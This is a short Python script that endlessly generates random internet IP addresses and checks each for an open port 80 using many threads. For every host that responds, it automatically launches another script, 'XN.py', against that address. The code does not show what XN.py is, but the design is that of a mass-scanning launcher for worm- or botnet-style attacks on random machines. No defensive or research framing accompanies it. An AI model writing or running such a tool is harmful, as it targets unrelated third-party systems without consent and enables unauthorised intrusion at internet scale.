import os
import random
import socket
import threading
from time import sleep

max_threads = int(open('thrd.txt', 'r').read().strip())


def check_port(ip):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        socket.setdefaulttimeout(2.0)
        result = sock.connect_ex((ip, 80))
        if result == 0:
            os.system(f"python3 XN.py {ip}")
        sock.close()
    except:
        pass


while True:
    ipl = []
    for i in range(50):
        ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
        ipl.append(ip)
    for ip in ipl:
        threading.Thread(target=check_port, args=[ip]).start()
        while threading.active_count() > max_threads:
            sleep(1)
